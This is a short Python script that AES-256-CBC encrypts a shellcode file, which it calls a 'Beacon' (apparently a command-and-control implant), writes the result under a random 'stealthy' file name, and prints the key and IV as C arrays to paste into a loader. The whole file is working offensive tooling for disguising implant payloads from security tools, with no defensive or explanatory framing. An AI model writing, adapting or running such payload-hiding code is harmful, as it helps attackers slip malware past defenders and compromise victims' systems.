#!/usr/bin/env python3
import os, sys, random, string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <shellcode.bin (e.g., https.bin)>")
    sys.exit(1)

input_file = sys.argv[1]

if not os.path.exists(input_file):
    print(f"[-] Error: File not found -> {input_file}")
    sys.exit(1)

with open(input_file, "rb") as f:
    plaintext = f.read()

# Generate 32-byte Key and 16-byte IV for AES-256
key = os.urandom(32)
iv = os.urandom(16)

# Apply PKCS7 padding
padder = PKCS7(128).padder()
padded = padder.update(plaintext) + padder.finalize()

# Encrypt in CBC mode
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
encryptor = cipher.encryptor()
ciphertext = encryptor.update(padded) + encryptor.finalize()

# Generate a random stealthy filename with a random .dat or .bin extension
random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 12)))
random_ext = random.choice([".dat", ".bin"])
output_filename = f"{random_name}{random_ext}"

with open(output_filename, "wb") as f_out:
    f_out.write(ciphertext)

print(f"[+] Beacon '{input_file}' successfully encrypted.")
print(f"[+] Output saved stealthily as: {output_filename} ({len(ciphertext)} bytes)\n")

print("-------------------------------------------------------------------------")
print("COPY THESE ARRAYS INTO YOUR C CODE:")
print("-------------------------------------------------------------------------")
print(f"unsigned char AesKey[32] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};")
print(f"unsigned char AesIv[16] = {{ {', '.join(f'0x{b:02X}' for b in iv)} }};")
print("-------------------------------------------------------------------------")
